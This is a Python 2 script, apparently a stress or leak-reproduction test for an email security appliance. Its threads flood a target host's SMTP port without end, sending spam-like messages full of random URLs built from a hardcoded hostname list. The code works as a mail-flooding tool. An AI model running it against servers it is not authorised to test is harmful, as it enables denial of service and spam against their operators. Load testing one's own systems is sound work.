import sys
import socket
import thread
import random
import time
import pprint

pp = pprint.pprint

try:
    xrange = xrange
except NameError:
    xrange = range

hostnames = ("www.20min.ch","www.JSON.org","www.Linotype.com","www.acabogacia.org","www.acabogacia.org0","www.adobe.com","www.ancert.com","www.anf.es","www.apache.org","www.ascendercorp.com","www.aserca.gob.mx","www.ask.com","www.banxico.gob.mx","www.bing.com","www.blogseye.com","www.bloomberg.com","www.boians.com","www.booking.com","www.cert.fnmt.es","www.certicamara.com","www.chambersign.org","www.chambersign.org1","www.clients1.google.com","www.cmegroup.com","www.comsign.co.il","www.crc.bg","www.crc.bg0","www.cum.maristas.edu.mx","www.debate.com.mx","www.digicert.com","www.disig.sk","www.dnie.es","www.downloadsource.es","www.dstype.com","www.ecee.gov.pt","www.elcorregidor.com.mx","www.elimparcial.com","www.eluniversal.com.mx","www.eluniversalsanantonio.mx","www.eme.lv","www.encinardemamre.com","www.englishtown.com","www.entrust.net","www.example.com","www.excelsior.com.mx","www.facebook.com","www.firmaprofesional.com","www.firmaprofesional.com0","www.ford.mx","www.gettyimages.com","www.gettyimages.com8BIM","www.globaltrust.info","www.gnu.org","www.google.com","www.google.com.mx","www.google.es","www.googleadservices.com","www.googocsp.verisign.com","www.honda.mx","www.htmldog.com","www.imagen.com.mx","www.inapesca.gob.mx","www.inca.gob.mx","www.infodefensa.com","www.informador.com.mx","www.jornada.unam.mx","www.kiplingmexico.com","www.kminek.pl","www.laredodod","www.lineto.com","www.linotype.com0","www.lolostock.com","www.lomabonita.gob.mx","www.mail.live.com","www.meanfreepath.com","www.mercadolibre.com.mx","www.mercadoshops.com.mx","www.mgvsolucionesvisuales.com","www.microsoft.co","www.microsoft.com","www.microsoft.com0","www.milenio.com","www.mimp.gob.pe","www.mindworkshop.com","www.miniinthebox.com","www.monotypeimaging.com","www.mvcomex.com.mx","www.myfonts.com","www.netsolssl.com","www.nissan.com.mx","www.nlm.nih.gov","www.norestegrill.com.mx","www.noroeste.com.mx","www.nsftools.com","www.oem.com.mx","www.opensource.org","www.pcreview.co.uk","www.pescamar.com.mx","www.pki.gva.es","www.poderjudicialdf.gob.mx","www.pricetravel.com.mx","www.quovadis.bm","www.quovadis.bm0","www.rcsc.lt","www.revistadonjuan.com","www.reyesaccordions.com","www.rtlsoft.com","www.sagarpa.gob.mx","www.sagarpa.tv","www.saludnaturalybelleza.com","www.sams.com.mx","www.sat.gob.mx","www.sdpno","www.sdpnoticias.com","www.sk.ee","www.skyzyx.com","www.slideshare.net","www.ssc.lt","www.startssl.com","www.suscerte.gob.ve","www.symantec.com","www.symauth.com","www.telcel.com","www.telesushi.com","www.tinglesoft.com","www.toyota.com.mx","www.tufuncion.com","www.typography.com","www.uniradionoticias.com","www.usertrust.com","www.usertrust.com1","www.usertrust.com1604","www.valicert.com","www.vancepublishing.com","www.vizury.com","www.vw.com.mx","www.w3.org","www.walterzorn.com","www.webcodigopostal.mx","www.www.microsoft.com","www.youngpup.net","www.youtube.com","www.zipeg.com","www.zuimoban.com","www2.smartadserver.com","www5.smartadserver.com","www_yahoclients1.google.com","wwww.microsoft.com","wwwww.microsoft.com")

hostnames_rng = len(hostnames)-1

## EMAIL_START = "Subject: spam test\nX-Advertisement: spam\n\nSpam test message.\n\n"
EMAIL_START = "Subject: spam test\n\nSpam test message.\n\n"
NUM_THREADS = 0

alpha = "abcdefg/hijklmnopqrstuvwxyz#-+%_[]{}()~\\/.*.?!@"
alpha_len = len(alpha)-1

CLIENT_SOCKETS = []

def randomurl():
	retVal = "http://%s/" % hostnames[random.randint(0,hostnames_rng)]
	for _ in xrange(random.randint(3,5000)):
		retVal = retVal + alpha[random.randint(0,len(alpha)-1)]
	return retVal + "\n\n"



def injectEmail(hostname):
	global NUM_THREADS
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((hostname, 25))
	print s.recv(256)
	s.send('mail from: <asdf@asdf.run>\n')
	print s.recv(256)
	s.send('rcpt to: <test@test.run>\n')
	print s.recv(256)
	s.send('data\n')
	print s.recv(256)
	for x in xrange(1, random.randint(1,20)):
		s.send(randomurl())
	s.send ("\n\n.\n")
	s.close()
	NUM_THREADS -= 1


def handleClientSockets(hostname, threads):
    global NUM_THREADS
    while 1:
		if NUM_THREADS < threads:
			thread.start_new_thread(injectEmail, (hostname, ))
			NUM_THREADS += 1
		time.sleep(.02)

    

if __name__ == '__main__':

    if (len(sys.argv) == 3):
        ##proxy = sys.argv[1]
        numConn = int(sys.argv[2])
        hostname = sys.argv[1]
        thread.start_new_thread(handleClientSockets, (hostname, numConn))
        time.sleep(9999999)
    else:
        print "sds_leak <ESA hostname> <number of connections>"




